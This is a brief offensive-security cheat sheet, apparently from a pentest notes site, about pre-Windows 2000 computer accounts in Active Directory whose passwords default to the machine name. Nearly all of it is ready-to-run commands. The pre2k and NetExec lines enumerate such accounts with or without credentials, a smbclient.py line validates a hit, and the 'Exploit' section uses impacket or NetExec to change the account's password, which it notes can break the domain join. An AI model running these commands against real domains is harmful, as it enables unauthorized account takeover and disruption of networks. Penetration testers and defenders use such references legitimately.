___
##  TL;DR:

### Identify


**Tools:** [pre2k](https://github.com/garrettfoster13/pre2k), [nxc](https://github.com/Pennyw0rth/NetExec)

**With creds**
```bash
pre2k auth -u <user> -d <DOMAIN> -p <pass> -dc-ip <dcip> -ldaps
```
or
```bash
nxc ldap <dc-ip> -u 'user' -p 'pass' -M pre2k
```

**Without creds**
```bash
pre2k unauth -d <DOMAIN> -dc-ip <dcip> -inputfile <listofcomputers>
```

!!! alert "Note"
	You can pass `-n` to check blank passwords as well

!!! alert "Manual mode"
	Without using the tool, you can check by identifying `pwdlastset: 12/31/1600 7:00:00PM`

!!! alert "Note"
	The only error that indicates an auth failure is `KDC_ERR_PREAUTH_FAILED` other errors do not mean you can't authenticate

**Validate**
```bash
smbclient.py domain/machinename\$:machinename@dc-ip
```
Expected output: `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT`

### Exploit

!!! alert "Note"
	this is semi-destructive, it may require the object be rejoined to the domain

Change the account password

**Imacket**
```bash
impacket-changpasswd.py domain/machinename\$:machinename@dc-ip -newpass <pass>
```

**NetExec**
```bash
nxc smb <dcip> -u machinename$ -p 'machinename' -M change-password -o NEWPASS=NewPassword
```